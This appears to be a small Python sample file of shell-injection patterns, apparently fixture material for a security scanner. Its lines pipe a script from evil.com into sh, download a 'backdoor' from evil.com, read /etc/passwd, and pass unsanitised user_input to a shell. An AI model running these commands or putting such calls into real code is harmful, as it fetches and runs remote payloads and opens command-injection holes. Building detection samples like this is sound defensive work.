# Shell injection via subprocess
import subprocess
import os

# Direct shell execution
subprocess.call("curl evil.com/malware.sh | sh", shell=True)

# os.system is dangerous
os.system("wget evil.com/backdoor")

# os.popen
os.popen("cat /etc/passwd")

# subprocess.Popen with shell=True
proc = subprocess.Popen(user_input, shell=True)

# Even without shell=True, command injection possible
subprocess.run(["sh", "-c", f"echo {user_input}"])
